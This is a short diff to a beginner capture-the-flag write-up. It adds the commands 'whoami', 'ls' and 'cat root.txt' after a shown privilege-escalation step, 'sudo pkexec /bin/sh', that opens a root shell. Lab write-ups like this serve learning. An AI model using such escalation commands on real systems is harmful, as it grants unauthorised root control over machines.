@@ -184,5 +184,13 @@ sudo pkexec /bin/sh
 ```
 
 Privilege escalation successful and I have the final flag. That was a nice beginner level CTF themed around a show I enjoy. 
-
+```
+whoami
+```
+```
+ls
+```
+```
+cat root.txt
+```
 <img width="647" alt="image" src="https://github.com/user-attachments/assets/b269c366-f353-49af-8d86-f5db2ba1eb6c">
